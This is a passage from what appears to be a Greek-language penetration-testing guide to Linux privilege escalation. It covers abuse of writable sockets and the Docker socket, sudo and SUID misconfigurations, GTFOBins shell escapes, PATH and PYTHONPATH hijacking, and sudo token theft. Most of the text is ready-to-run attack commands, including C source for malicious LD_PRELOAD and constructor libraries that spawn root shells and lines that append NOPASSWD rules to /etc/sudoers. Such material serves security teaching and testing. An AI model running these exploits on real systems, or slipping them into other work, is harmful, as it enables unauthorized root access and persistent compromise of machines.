* `ExecStopPre`, `ExecStopPost`: Επιπλέον **εντολές** που εκτελούνται **πριν** ή **μετά** από τα ακούσματα των **sockets**/FIFOs να **κλείσουν** και να αφαιρεθούν, αντίστοιχα.
* `Service`: Καθορίζει το όνομα της **μονάδας υπηρεσίας** που **θα ενεργοποιηθεί** στη **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προεπιλέγεται στην υπηρεσία που φέρει το ίδιο όνομα με το socket (με το επίθεμα αντικαταστάθηκε). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να είναι απαραίτητο να χρησιμοποιήσετε αυτή την επιλογή.

### Εγγράψιμα αρχεία .socket

Αν βρείτε ένα **εγγράψιμο** αρχείο `.socket` μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Συνεπώς, ίσως χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση η συσκευή.\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη διαμόρφωση του αρχείου socket, αλλιώς το backdoor δεν θα εκτελεστεί_

### Εγγράψιμα sockets

Αν **εντοπίσετε οποιοδήποτε εγγράψιμο socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα αρχεία διαμόρφωσης `.socket`_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε μια ευπάθεια.

### Απαρίθμηση Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP sockets

Σημειώστε ότι ενδέχεται να υπάρχουν **sockets που ακούνε για HTTP** αιτήσεις (_δεν αναφέρομαι σε αρχεία .socket αλλά σε αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στη διαδρομή `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να προστατεύεται. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή δικαιωμάτων εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε ανάβαση προνομίων. Εδώ υπάρχει μια ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι εάν το Docker CLI δεν είναι διαθέσιμο.

#### **Ανάβαση Προνομίων με το Docker CLI**

Εάν έχετε δικαιώματα εγγραφής στο Docker socket, μπορείτε να αναβαθμίσετε τα προνόμιά σας χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
### **Χρήση του Docker API Απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί να χειριστεί ακόμα χρησιμοποιώντας το Docker API και εντολές `curl`.

1. **Λίστα Εικόνων Docker:** Ανάκτηση της λίστας των διαθέσιμων εικόνων.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Δημιουργία Ενός Εμπορεύματος:** Αποστολή αιτήματος για τη δημιουργία ενός εμπορεύματος που συνδέει το ριζικό κατάλογο του συστήματος φιλοξενίας.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Εκκίνηση του νεοδημιουργημένου εμπορέα:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Σύνδεση στο Εμπορεύμα:** Χρησιμοποιήστε το `socat` για να καθιερώσετε μια σύνδεση με το εμπορεύμα, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Μετά την ρύθμιση της σύνδεσης `socat`, μπορείτε να εκτελέσετε εντολές απευθείας στο εμπορεύμα με πρόσβαση σε root επίπεδο στο αρχείο συστήματος του φιλοξενητή.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο socket του docker επειδή βρίσκεστε **μέσα στην ομάδα `docker`** έχετε [**περισσότερους τρόπους ανάδειξης δικαιωμάτων**](interesting-groups-linux-pe/#docker-group). Αν το [**API του docker ακούει σε ένα θύρα** μπορείτε επίσης να τον απειλήσετε](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Ελέγξτε **περισσότερους τρόπους να διαφύγετε από το docker ή να το καταχραστείτε για ανάδειξη δικαιωμάτων** σε:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Ανάδειξη Δικαιωμάτων Containerd (ctr)

Αν βρείτε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την παρακάτω σελίδα καθώς **μπορείτε να την καταχραστείτε για ανάδειξη δικαιωμάτων**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Ανάδειξη Δικαιωμάτων **RunC**

Αν βρείτε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την παρακάτω σελίδα καθώς **μπορείτε να την καταχραστείτε για ανάδειξη δικαιωμάτων**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο **σύστημα Επικοινωνίας Διεργασιών (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποτελεσματικά. Σχεδιασμένο με το μοντέρνο σύστημα Linux στο μυαλό, προσφέρει ένα στιβαρό πλαίσιο για διάφορες μορφές επικοινωνίας εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασική IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, θυμίζοντας τις βελτιωμένες UNIX domain sockets. Επιπλέον, βοηθά στη μετάδοση συμβάντων ή σημάτων, προωθώντας την ομαλή ενσωμάτωση μεταξύ στοιχείων του συστήματος. Για παράδειγμα, ένα σήμα από ένα δαίμονα Bluetooth για μια εισερχόμενη κλήση μπορεί να προκαλέσει τον σίγαση του μουσικού παίκτη, βελτιώνοντας την εμπειρία του χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα απομακρυσμένο σύστημα αντικειμένων, απλοποιώντας τις αιτήσεις υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών, διευκολύνοντας τις διαδικασίες που ήταν παραδοσιακά πολύπλοκες.

Το D-Bus λειτουργεί με βάση ένα μοντέλο **επιτροπής/απαγόρευσης**, διαχειρίζοντας τις άδειες μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κλπ) με βάση το συνολικό αποτέλεσμα των κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το λεωφορείο, ενδεχομένως επιτρέποντας την ανάδειξη δικαιωμάτων μέσω της εκμετάλλευσης αυτών των αδειών.

Παρέχεται ένα παράδειγμα μιας τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει τις άδειες για το ριζικό χρήστη να κατέχει, να στέλνει και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Οι πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα ισχύουν καθολικά, ενώ οι πολιτικές πλαισίου "προεπιλογή" ισχύουν για όλους όσοι δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να απαριθμήσετε και να εκμεταλλευτείτε μια επικοινωνία D-Bus εδώ:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να απαριθμήσετε το δίκτυο και να καταλάβετε τη θέση της μηχανής.

### Γενική απαρίθμηση
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτές θύρες

Πάντα ελέγχετε τις δικτυακές υπηρεσίες που εκτελούνται στον υπολογιστή και με τις οποίες δεν ήταν δυνατή η αλληλεπίδραση πριν την πρόσβαση:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Καταγραφή Κίνησης

Ελέγξτε εάν μπορείτε να καταγράψετε την κίνηση. Αν μπορείτε, θα μπορούσατε να αποκτήσετε πρόσβαση σε ορισμένα διαπιστευτήρια.
```
timeout 1 tcpdump
```
## Χρήστες

### Γενική Απαρίθμηση

Ελέγξτε **ποιος** είστε, ποια **προνόμια** έχετε, ποιοι **χρήστες** υπάρχουν στο σύστημα, ποιοι μπορούν να **συνδεθούν** και ποιοι έχουν **δικαιώματα root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Μεγάλο UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα σφάλμα που επιτρέπει σε χρήστες με **UID > INT\_MAX** να αναβαθμίσουν τα προνόμιά τους. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας χορηγήσει ριζικά προνόμια:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον μέσα στο πρόχειρο (εάν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Εκνομές κωδικοί

Αν **γνωρίζετε κάποιον κωδικό** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό.

### Su Brute

Αν δεν σας πειράζει να προκαλέσετε πολύ θόρυβο και οι δυνατότητες `su` και `timeout` υπάρχουν στον υπολογιστή, μπορείτε να δοκιμάσετε να εκτελέσετε βίαια τον χρήστη χρησιμοποιώντας το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` επίσης δοκιμάζει να εκτελέσει βίαια τους χρήστες.

## Κατάχρηση εγγράψιμων PATH

### $PATH

Αν ανακαλύψετε ότι μπορείτε **να γράψετε μέσα σε κάποιο φάκελο του $PATH**, ενδέχεται να μπορείτε να αναβαθμίσετε τα δικαιώματά σας με τον τρόπο **δημιουργίας μιας πίσω πόρτας μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που θα εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από έναν φάκελο που βρίσκεται προηγούμενος** στον εγγράψιμο φάκελο στο $PATH σας.

### SUDO και SUID

Μπορείτε να επιτραπείτε να εκτελέσετε κάποια εντολή χρησιμοποιώντας το sudo ή ενδέχεται να έχουν το bit suid. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Μερικές **απροσδόκητες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμα και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η διαμόρφωση του Sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια ενός άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`, είναι τώρα εύκολο να αποκτήσετε ένα κέλυφος προσθέτοντας ένα κλειδί ssh στον κατάλογο root ή καλώντας το `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιας εντολής:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στη μηχανή HTB Admirer**, ήταν **ευάλωτο** στο **PYTHONPATH hijacking** για τη φόρτωση ενός αυθαίρετου βιβλιοθήκης Python κατά την εκτέλεση του script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Παράκαμψη εκτέλεσης Sudo μέσω διαδρομών

**Μεταβείτε** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **συμβολικούς συνδέσμους**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Εάν χρησιμοποιείται ένα **wildcard** (\*), τότε είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντιμέτρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Εντολή Sudo/SUID δυαδικό χωρίς διαδρομή εντολής

Αν η **άδεια sudo** δίνεται σε μια μόνο εντολή **χωρίς να καθοριστεί η διαδρομή**: _hacker10 ALL= (root) less_ μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί εάν ένα **suid** δυαδικό αρχείο εκτελεί ένα άλλο πρόγραμμα χωρίς να καθορίζει τη διαδρομή για αυτό (ελέγξτε πάντα με την εντολή **strings** το περιεχόμενο ενός παράξενου SUID δυαδικού).

[Παραδείγματα φορτίου για εκτέλεση.](payloads-to-execute.md)

### SUID δυαδικό με διαδρομή εντολής

Εάν το **suid** δυαδικό αρχείο εκτελεί ένα άλλο πρόγραμμα καθορίζοντας τη διαδρομή, τότε μπορείτε να δοκιμάσετε να **εξάγετε μια συνάρτηση** με το όνομα της εντολής που καλεί το αρχείο suid.

Για παράδειγμα, εάν ένα suid δυαδικό αρχείο καλεί το _**/usr/sbin/service apache2 start**_ πρέπει να δοκιμάσετε να δημιουργήσετε τη συνάρτηση και να την εξάγετε:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Η μεταβλητή περιβάλλοντος **LD\_PRELOAD** χρησιμοποιείται για να καθορίσει έναν ή περισσότερους κοινόχρηστους κώδικες (.so αρχεία) που θα φορτωθούν από τον φορτωτή πριν από όλους τους άλλους, συμπεριλαμβανομένης της τυπικής βιβλιοθήκης C (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως προ-φόρτωση βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της λειτουργίας, ιδιαίτερα με εκτελέσιμα **suid/sgid**, το σύστημα επιβάλλει ορισμένες συνθήκες:

- Ο φορτωτής αγνοεί το **LD\_PRELOAD** για εκτελέσιμα όπου ο πραγματικός αναγνωριστικός χρήστης (_ruid_) δεν ταιριάζει με το αποτέλεσμα του αποτελεσματικού αναγνωριστικού χρήστη (_euid_).
- Για εκτελέσιμα με suid/sgid, φορτώνονται μόνο βιβλιοθήκες σε τυπικά μονοπάτια που είναι επίσης suid/sgid.

Η εξέλιξη προνομιακών δικαιωμάτων μπορεί να συμβεί αν έχετε τη δυνατότητα να εκτελέσετε εντολές με `sudo` και η έξοδος της `sudo -l` περιλαμβάνει τη δήλωση **env\_keep+=LD\_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD\_PRELOAD** να διατηρείται και να αναγνωρίζεται ακόμα και όταν οι εντολές εκτελούνται με `sudo`, πιθανώς οδηγώντας στην εκτέλεση κώδικα με υψηλά προνομιακά δικαιώματα.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **μεταγλωττίστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **αναβαθμίστε τα προνόμια** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Μια παρόμοια ανόρθωση προνομίων μπορεί να καταχραστεί αν ο επιτιθέμενος ελέγχει τη μεταβλητή περιβάλλοντος **LD\_LIBRARY\_PATH** επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – Εισαγωγή .so

Όταν αντιμετωπίζετε ένα δυαδικό αρχείο με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την παρακάτω εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει ένα δυνητικό σημείο εκμετάλλευσης.

Για να εκμεταλλευτεί κάποιος αυτό, θα πρέπει να συνεχίσει δημιουργώντας ένα αρχείο C, λέγοντάς το _"/path/to/.config/libcalc.c"_, περιέχοντας τον παρακάτω κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, αφού μεταγλωττιστεί και εκτελεστεί, στοχεύει στην αύξηση προνομίων με τον χειρισμό δικαιωμάτων αρχείων και την εκτέλεση ενός κελύφους με αυξημένα προνόμια.

Μεταγλωττίστε το παραπάνω αρχείο C σε ένα αρχείο κοινόχρηστου αντικειμένου (.so) με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου δυαδικού SUID θα πρέπει να ενεργοποιήσει την εκμετάλλευση, επιτρέποντας την πιθανή κατάληψη του συστήματος.

## Κοινόχρηστη Εκμετάλλευση Αντικειμένου
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που βρήκαμε ένα SUID δυαδικό που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με τον απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να περιέχει μια συνάρτηση που ονομάζεται `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια συλλογή Unix δυαδικών που μπορούν να εκμεταλλευτούν από έναν εισβολέα για να παρακάμψει τους τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισάγετε ορίσματα** σε ένα εντολή.

Το έργο συλλέγει νόμιμες λειτουργίες των Unix δυαδικών που μπορούν να καταχραστούν για να διαφύγουν από περιορισμένα κελιά, να αναβαθμίσουν ή να διατηρήσουν υψηλά προνόμια, να μεταφέρουν αρχεία, να εκκινήσουν bind και αντίστροφα κελιά, και να διευκολύνουν τις άλλες εργασίες μετά την εκμετάλλευση.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Αν μπορείτε να έχετε πρόσβαση στο `sudo -l` μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει τρόπο να εκμεταλλευτεί οποιονδήποτε κανόνα sudo.

### Επαναχρησιμοποίηση Διακριτικών Sudo

Σε περιπτώσεις όπου έχετε **πρόσβαση sudo** αλλά όχι τον κωδικό πρόσβασης, μπορείτε να αναβαθμίσετε τα προνόμια σας με το **να περιμένετε για την εκτέλεση μιας εντολής sudo και στη συνέχεια να αρπάξετε το διακριτικό συνεδρίας**.

Απαιτήσεις για την ανάκτηση προνομίων:

* Έχετε ήδη ένα κέλυφος ως χρήστης "_sampleuser_"
* Ο χρήστης "_sampleuser_" έχει **χρησιμοποιήσει το `sudo`** για να εκτελέσει κάτι τις **τελευταίες 15 λεπτά** (από προεπιλογή αυτή είναι η διάρκεια του διακριτικού sudo που μας επιτρέπει να χρησιμοποιούμε το `sudo` χωρίς να εισάγουμε κωδικό πρόσβασης)
* `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
* Το `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας το `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας `kernel.yama.ptrace_scope = 0`)

Αν πληρούνται όλες αυτές οι απαιτήσεις, **μπορείτε να αναβαθμίσετε τα προνόμια χρησιμοποιώντας:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* Η **πρώτη εκμετάλλευση** (`exploit.sh`) θα δημιουργήσει το δυαδικό `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για **να ενεργοποιήσετε το διακριτικό sudo στη συνεδρία σας** (δεν θα λάβετε αυτόματα ένα κελί ρίζας, κάντε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **υπό την ιδιοκτησία του root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που καθιστά τα **sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν το sudo**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<ΌνομαΧρήστη>

Εάν έχετε **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα δημιουργημένα αρχεία μέσα στον φάκελο, μπορείτε να χρησιμοποιήσετε το δυαδικό [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και ένα PID**.\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα κέλυφος ως αυτόν τον χρήστη με PID 1234, μπορείτε **να αποκτήσετε δικαιώματα sudo** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιήσει το `sudo` και πώς. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε **να διαβάσετε** αυτό το αρχείο, θα μπορούσατε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε **να γράψετε** οποιοδήποτε αρχείο, θα μπορείτε να **εξελίξετε τα δικαιώματά σας**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να καταχραστείς αυτήν την άδεια
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Άλλος τρόπος για να καταχραστείτε αυτές τις άδειες:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές λύσεις για το δυαδικό `sudo` όπως το `doas` για το OpenBSD, θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Απάτη με το Sudo

